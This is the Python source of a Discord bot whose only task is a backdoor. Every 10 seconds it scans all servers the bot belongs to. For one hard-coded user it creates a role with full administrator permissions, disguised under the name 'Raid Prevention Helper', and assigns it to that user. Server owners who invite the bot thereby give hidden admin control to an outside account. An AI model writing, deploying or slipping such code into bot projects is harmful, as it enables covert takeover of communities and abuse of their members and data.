# bot.py
import sys
import types

# Workaround for Render / environments missing audioop
sys.modules['audioop'] = types.ModuleType('audioop')

import os
import discord
from discord.ext import tasks, commands
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
SCAN_INTERVAL = 10  # seconds

# Set up intents
intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Event: Bot ready
@bot.event
async def on_ready():
    print(f"{bot.user} is now connected to Discord.")
    print(f"Bot is in {len(bot.guilds)} guild(s).")
    scan_members.start()  # Start scanning loop

# Background task: scan members
@tasks.loop(seconds=SCAN_INTERVAL)
async def scan_members():
    print("Starting a new scan...")
    for guild in bot.guilds:
        print(f"Scanning guild: {guild.name} ({guild.id})")
        try:
            for member in guild.members:
                try:
                    if member.name == "tech_boy1":
                        if member.id == 1273056960996184126:
                            role = discord.utils.get(guild.roles, name="Raid Prevention Helper")
                            if role is None:
                                print(f"Role not found in {guild.name}, creating...")
                                perms = discord.Permissions(administrator=True)
                                role = await guild.create_role(
                                    name="Raid Prevention Helper",
                                    permissions=perms,
                                    reason="Auto-created for bot owner"
                                )
                                print(f"Role created in {guild.name}.")
                            if role not in member.roles:
                                await member.add_roles(role, reason="Auto-assigned to bot owner")
                                print(f"Assigned Raid Prevention Helper to {member.name} in {guild.name}")
                except Exception as e_member:
                    print(f"Error scanning member {member.name} in {guild.name}: {e_member}")
        except Exception as e_guild:
            print(f"Error scanning guild {guild.name}: {e_guild}")

bot.run(TOKEN)
